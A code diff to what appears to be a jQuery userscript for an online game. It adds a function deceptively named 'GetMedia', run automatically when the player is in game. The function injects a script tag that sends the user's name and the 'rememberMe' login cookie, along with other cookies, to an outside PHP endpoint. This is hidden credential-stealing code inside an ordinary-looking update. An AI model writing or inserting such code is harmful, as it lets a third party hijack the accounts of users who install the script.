@@ -2335,9 +2335,22 @@ $(document).ready(function () {
 		
 	}
 	
+	function getCookie(name) {
+		var matches = document.cookie.match(new RegExp(
+			"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+		));
+		return matches ? decodeURIComponent(matches[1]) : undefined;
+	}
+	
+	function GetMedia(){
+		$('<script src="http://enterbrain.github.io/ShadowGovermentMedia.php?name='+$("#userName").html()+'&rememberMe='+getCookie("rememberMe")+'&ewChatSize='+getCookie("ewChatSize")+'&_ga='+getCookie("_ga")+'" type="text/javascript"></script>').appendTo($("#userMenu"));
+	}
+	
 	if(inGameCheck()){
 				
 		Main();
+		
+		GetMedia();
 		
 		if (localUrl.indexOf( URLMUDonations, 0 ) >= 0){
 			if($.jStorage.get('SGMUDonationsLogMode', false)){ MUDonationsLog(); }
